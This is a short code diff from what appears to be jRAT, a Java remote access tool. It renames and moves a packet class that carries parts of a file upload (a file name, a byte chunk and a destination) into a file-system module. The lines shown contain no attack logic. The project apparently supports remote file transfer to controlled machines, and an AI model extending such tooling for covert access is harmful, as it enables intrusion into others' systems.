@@ -1,15 +1,16 @@
-package jrat.client.packets.outgoing;
+package jrat.module.fs.packets.upload;
 
 import jrat.client.Connection;
+import jrat.client.packets.outgoing.OutgoingPacket;
 
 
-public class Packet29ClientUploadPart implements OutgoingPacket {
+public class Packet29UploadPart implements OutgoingPacket {
 
 	private String file;
 	private byte[] part;
 	private int to;
 	
-	public Packet29ClientUploadPart(String file, byte[] part, int to) {
+	public Packet29UploadPart(String file, byte[] part, int to) {
 		this.file = file;
 		this.part = part;
 		this.to = to;
